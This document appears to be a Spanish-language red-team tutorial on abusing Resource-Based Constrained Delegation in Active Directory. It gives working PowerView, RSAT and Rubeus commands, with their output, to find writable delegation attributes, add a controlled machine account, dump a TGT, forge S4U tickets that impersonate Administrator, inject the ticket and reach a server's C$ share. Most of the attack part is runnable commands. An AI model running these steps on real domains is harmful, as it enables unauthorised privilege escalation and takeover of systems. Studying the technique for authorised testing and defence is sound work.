La delegación restringida clásica tiene un problema de gestión: para tocar el atributo `msDS-AllowedToDelegateTo` hace falta el privilegio `SeEnableDelegationPrivilege`, que solo tienen los admins de dominio. Microsoft lo consideró un fallo: el dueño de un servicio de back-end no tenía forma de controlar quién delegaba hacia él.

**RBCD (Resource-Based Constrained Delegation)**, de Server 2012, le da la vuelta al modelo: ya no es el servicio de **interfaz** quien dice a quién delega, sino el servicio de **back-end** quien decide qué interfaces pueden delegarle. Y solo requiere acceso de escritura a un atributo, no privilegios de dominio.

Eso se controla con el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` de la cuenta de back-end. Un admin con derechos delegados lo configura con los cmdlets de RSAT:

```
$front = Get-ADComputer -Identity 'server-ws'
$back  = Get-ADComputer -Identity 'server-files'
Set-ADComputer -Identity $back -PrincipalsAllowedToDelegateToAccount $front
```

El abuso es distinto al de otras delegaciones: comprometer el front **no** compromete el back. Pero un atacante puede aprovechar RBCD para tomar un equipo si se cumplen dos condiciones:

- Tiene **escritura** sobre el `msDS-AllowedToActOnBehalfOfOtherIdentity` de un equipo objetivo.
- Controla **otro principal con un SPN** configurado.

---

#### Paso 1 · Encontrar dónde tenemos escritura (WriteProperty)

Cada atributo de AD tiene un GUID; el de `msDS-AllowedToActOnBehalfOfOtherIdentity` es `3f78c3e5-f79a-46bd-a0b8-9d18116ddc79`. Con PowerView se leen las ACL de todos los equipos y se filtra por ese GUID + `WriteProperty`:

```
Get-DomainComputer | Get-DomainObjectAcl | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty' } | select ObjectDN,SecurityIdentifier

ObjectDN                                       SecurityIdentifier
CN=SERVER-WS,OU=Servers,DC=dragon,DC=com       S-1-5-21-...-1107
CN=SERVER-FILES,OU=Servers,DC=dragon,DC=com    S-1-5-21-...-1107
```

Ese SID es quien tiene el permiso. Lo resolvemos a un grupo/usuario:

```
Get-ADGroup -Filter 'objectsid -eq "S-1-5-21-...-1107"'

Name           : Server Admins
SamAccountName : Server Admins
```

Conclusión: cualquier miembro de "Server Admins" puede escribir el atributo en esos dos equipos. Ojo: el permiso puede venir también de un `GenericWrite`/`GenericAll` sobre el objeto entero, no solo de la propiedad concreta.

#### Paso 2 · Conseguir un principal con SPN

Toda delegación exige una cuenta con SPN. Opciones:

- **Otra cuenta de equipo** si tienes SYSTEM en algún sitio (todo equipo trae SPN por defecto: HOST, RestrictedKrbHost, TERMSRV, WSMAN).
- **Una cuenta de servicio** cuyas credenciales hayas obtenido (p. ej. por Kerberoasting).
- **Crear tu propio equipo**: el atributo `msDS-MachineAccountQuota` deja a cualquier usuario crear hasta 10 cuentas de equipo por defecto. Herramientas como StandIn los crean por LDAP.

#### Paso 3 · El ataque

Leemos el estado actual del atributo (vía `PrincipalsAllowedToDelegateToAccount`):

```
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount | select Name,PrincipalsAllowedToDelegateToAccount

Name           PrincipalsAllowedToDelegateToAccount
SERVER-FILES   {CN=SERVER-WS,OU=Servers,DC=dragon,DC=com}
```

Una colección de AD solo admite valores del mismo tipo; como `server-files` ya contiene una cuenta de equipo, debemos añadir otra cuenta de equipo (no un usuario). Añadimos `server-ws2` **sin** borrar la existente:

```
$ws1 = Get-ADComputer -Identity 'server-ws'
$ws2 = Get-ADComputer -Identity 'server-ws2'
Set-ADComputer -Identity 'server-files' -PrincipalsAllowedToDelegateToAccount $ws1,$ws2
```

Ahora extraemos (o pedimos) un TGT del principal recién añadido y hacemos los pasos S4U con Rubeus. Primero el TGT desde memoria:

```
Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap

  UserName  : server-ws2$
    Base64EncodedTicket : doIFr[...recortado...]kNPTQ==
```

Y el S4U completo contra el back-end, suplantando a Administrator:

```
Rubeus.exe s4u /user:server-ws2$ /impersonateuser:Administrator /msdsspn:cifs/server-files /ticket:doIFr[...recortado...]kNPTQ== /nowrap

[+] S4U2self success!
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/server-files':
      doIGh[...recortado...]nMtMQ==
```

- `/user` → el principal con SPN que controlamos (la cuenta de equipo añadida).
- `/impersonateuser` → usuario a suplantar.
- `/msdsspn` → SPN del servicio objetivo en el back-end.
- `/ticket` → TGT del principal.

Importamos el ticket y accedemos al `C$`:

```
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /username:Administrator /password:FakePass /ticket:doIGh[...recortado...]nMtMQ==
[+] ProcessID : 4568

steal_token 4568
ls \\server-files\c$
 [...listado del C$...]
```

#### Limpieza

Conviene dejar el atributo como estaba, volviendo a poner solo la cuenta original:

```
Set-ADComputer -Identity 'server-files' -PrincipalsAllowedToDelegateToAccount $ws1
```
